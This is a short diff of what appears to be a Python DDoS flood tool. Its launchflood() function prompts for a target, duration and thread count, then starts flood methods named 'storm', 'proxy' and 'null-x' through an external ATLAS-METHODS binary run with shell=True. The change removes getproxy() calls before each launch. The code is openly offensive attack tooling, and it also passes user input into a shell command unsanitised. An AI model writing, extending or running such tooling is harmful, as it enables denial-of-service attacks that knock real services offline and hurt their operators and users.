@@ -189,7 +189,6 @@ def launchflood():
 				target = input("[X] Target: ")
 				floodtime = int(input("[X] Time: "))
 				thread = int(input("[X] Threads [5-10]: "))
-				getproxy()
 				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} storm {thread}'], shell=True)
 			except:
 				print("Error try again")
@@ -198,7 +197,6 @@ def launchflood():
 				target = input("[X] Target: ")
 				floodtime = int(input("[X] Time: "))
 				thread = int(input("[X] Threads [5-10]: "))
-				getproxy()
 				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy {thread}'], shell=True)
 			except:
 				print("Error try again")
@@ -207,7 +205,6 @@ def launchflood():
 				target = input("[X] Target: ")
 				floodtime = int(input("[X] Time: "))
 				thread = int(input("[X] Threads [5-10]: "))
-				getproxy()
 				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} null-x {thread}'], shell=True)
 			except:
 				print("Error try again")
